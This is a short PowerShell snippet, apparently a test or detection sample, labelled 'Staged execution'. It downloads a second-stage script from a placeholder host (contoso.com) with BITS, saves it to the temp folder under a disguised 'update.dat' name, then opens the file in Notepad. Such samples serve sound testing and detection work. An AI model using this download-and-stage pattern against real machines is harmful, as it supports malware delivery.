
<# Staged execution #> $Stage2Url = "http://contoso.com/updater.ps1"; $LocalPath = "$env:TEMP\update.dat"; Start-BitsTransfer -Source $Stage2Url -Destination $LocalPath; Start-Process -FilePath "notepad.exe" -ArgumentList $LocalPath; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
